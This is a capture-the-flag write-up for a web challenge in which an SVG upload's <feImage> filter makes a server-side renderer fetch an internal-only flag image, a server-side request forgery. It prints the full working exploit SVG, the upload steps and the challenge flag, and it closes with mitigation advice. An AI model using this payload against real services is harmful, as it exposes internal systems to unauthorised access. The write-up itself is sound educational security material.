# Mouth of Sauron - CTF Writeup

## Challenge Information
- **Platform**: UWSP Pointer Overflow CTF
- **Category**: Web
- **Difficulty**: Hard
- **Flag**: `poctf{uwsp_4ll_w3_533_4nd_4ll_w3_533m}`

## Challenge Description
The challenge presents a "Palantír Press Office" web application that accepts SVG file uploads and generates server-side rendered PNG thumbnails. The application preserves filter primitives during the sanitization process. The goal is to retrieve a flag from an internal host (`barad-dur:31337/flag.png`) that is only accessible from the server.

## Vulnerability Discovery

### Initial Analysis
1. The application accepts SVG uploads (max 512 KB)
2. Server-side rendering is performed to create 900×600 PNG thumbnails
3. **Key finding**: The description explicitly states "The renderer preserves filter primitives (e.g., `<feImage>`, `<feBlend>`, `<feComposite>`)"
4. An internal host `barad-dur:31337` contains the flag at `/flag.png`
5. Only the server-side renderer can access the internal host

### Vulnerability Identification
The preservation of SVG filter primitives, specifically `<feImage>`, creates a **Server-Side Request Forgery (SSRF)** vulnerability. The `<feImage>` element can reference external resources via the `href` attribute, causing the server to fetch resources during rendering.

## Exploitation

### Attack Vector
Since the server preserves the `<feImage>` filter primitive, we can craft an SVG that instructs the server-side renderer to fetch the flag from the internal host.

### Exploit SVG
```svg
<svg xmlns="http://www.w3.org/2000/svg" width="900" height="600">
  <defs>
    <filter id="ssrf-filter" x="0%" y="0%" width="100%" height="100%">
      <!-- Use feImage to fetch the flag from the internal host -->
      <feImage href="http://barad-dur:31337/flag.png" result="externalImage"/>
      <feComposite in="externalImage" operator="over"/>
    </filter>
  </defs>

  <!-- Apply the filter to a rectangle covering the entire canvas -->
  <rect x="0" y="0" width="900" height="600" fill="white" filter="url(#ssrf-filter)"/>
</svg>
```

### How It Works
1. The `<feImage>` element with `href="http://barad-dur:31337/flag.png"` tells the SVG renderer to fetch the image from the internal host
2. The `<feComposite>` operator combines the fetched image into the final output
3. The filter is applied to a full-canvas rectangle, ensuring the entire fetched image is visible
4. When the server renders this SVG to PNG, it makes a request to the internal host and includes the flag image in the output

### Execution Steps
1. Created the exploit SVG file ([ssrf_exploit.svg](ssrf_exploit.svg))
2. Uploaded the SVG through the web interface
3. The server processed the upload and redirected to an asset page with a unique token
4. Downloaded the rendered PNG thumbnail
5. The PNG contained the flag rendered as text: `poctf{uwsp_4ll_w3_533_4nd_4ll_w3_533m}`

## Key Takeaways
- SVG filter primitives like `<feImage>` can cause SSRF vulnerabilities when server-side rendering is performed
- Even with sanitization, preserving certain SVG features can create attack vectors
- Server-side renderers should either:
  - Block external resource references in filter primitives
  - Whitelist allowed domains for external resources
  - Strip all filter primitives during sanitization

## References
- [SVG Filter Effects](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/filter)
- [feImage Element](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/feImage)
- [SSRF via SVG](https://hackerone.com/reports/223203)
